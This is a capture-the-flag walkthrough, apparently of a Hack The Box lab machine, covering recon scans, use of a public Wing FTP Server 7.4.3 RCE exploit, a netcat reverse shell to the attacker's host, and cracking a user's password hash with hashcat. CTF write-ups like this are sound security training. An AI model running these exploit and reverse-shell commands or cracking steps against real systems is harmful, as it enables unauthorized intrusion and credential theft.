Let's do the initial recon
```bash
Preview all results? (Y/n) y

== ferox_http_80.txt ==
200      GET    10724l    20204w   204037c http://wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
200      GET      149l      837w    67141c http://wingdata.htb/assets/images/about-left-image.png
200      GET      151l      333w     3905c http://wingdata.htb/assets/js/templatemo-custom.js
200      GET     1577l     3269w    31620c http://wingdata.htb/assets/css/templatemo-space-dynamic.css
200      GET      186l      505w     4928c http://wingdata.htb/assets/css/owl.css
200      GET      193l      571w     5974c http://wingdata.htb/assets/js/animation.js
200      GET      251l     1069w    12492c http://wingdata.htb/
200      GET      251l     1069w    12492c http://wingdata.htb/index.html
200      GET        2l     1283w    86927c http://wingdata.htb/vendor/jquery/jquery.min.js
200      GET     3158l     6952w    76080c http://wingdata.htb/assets/css/animated.css
200      GET      329l     1996w   148839c http://wingdata.htb/assets/images/banner-right-image.png
200      GET     3448l    10094w    93438c http://wingdata.htb/assets/js/owl-carousel.js
200      GET       44l      333w    19982c http://wingdata.htb/assets/images/contact-decoration.png
200      GET      496l     1721w    13281c http://wingdata.htb/assets/js/imagesloaded.js
200      GET        4l       64w    23742c http://wingdata.htb/assets/css/fontawesome.css
200      GET        7l     1002w    80223c http://wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
301      GET        9l       29w      353c http://wingdata.htb/assets => http://wingdata.htb/assets/
301      GET        9l       29w      353c http://wingdata.htb/vendor => http://wingdata.htb/vendor/

== ferox_sub_ftp.txt ==
200      GET        0l        0w        0c http://ftp.wingdata.htb/css
200      GET       10l       52w      678c http://ftp.wingdata.htb/
200      GET      263l      696w     7987c http://ftp.wingdata.htb/login.html

== nmap_results.txt ==
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-03 12:30 -0400
Nmap scan report for wingdata.htb (10.129.244.106)
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.93 seconds

== subDomains.txt ==
ftp

============================================
  RECON SUMMARY
  Target:    10.129.244.106
  DNS:       wingdata.htb
  Generated: 2026-04-03 12:36:16
============================================

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp   ssh          OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
  80/tcp   http         Apache httpd 2.4.66

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80
  HTTPS:  none

--------------------------------------------
  SUBDOMAINS  (1 found)
--------------------------------------------
  ftp.wingdata.htb

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------
  

============================================


=== Done! Results: /home/kali/github/ctf_tool/results/wingdata.htb/ ===
```

We got ssh and a website running on apache. There is also a ftp subdomain. 

I didn't find anything on the website, so i went to check out the ftp.


There we can see a login screen and its wing ftp server v7.4.3

```bash
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)             | multiple/remote/52347.py
```

https://www.exploit-db.com/exploits/52347

```bash
python3 52347.py -u http://ftp.wingdata.htb -c id                

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
[+] UID extracted: 91c17aa0f76aed592e4e547a4a0f4f15f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 91c17aa0f76aed592e4e547a4a0f4f15f528764d624db129b32c21fbca0cb8d6                                                                                                

--- Command Output ---                                                                                             
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
----------------------


```



OK so we have RCE here. Now let's just craft a reverse shell to get  into the system

```bash
python 52347.py -u http://ftp.wingdata.htb -c "nc -c bash 10.10.14.175 4444"                                  

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc -c bash 10.10.14.175 4444' and username: 'anonymous'                                                                                               
[+] UID extracted: c3a83efee4bf51fcb54d1b7afce49191f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: c3a83efee4bf51fcb54d1b7afce49191f528764d624db129b32c21fbca0cb8d6   


nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.175] from (UNKNOWN) [10.129.244.106] 46916
id 
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

Let's make the terminal more readable with "script -c bash /dev/null"


Ok now its time to search for a way to escalate our priviledges.

```bash
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml    
cat wacky.xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```


<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>

Looks like a hash of some sort.

```bash
hashcat -m 1410 -a 0 hash /usr/share/wordlists/rockyou.txt --show
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

It took me a while to figure out the salt but after a hint i managed to figure it out.

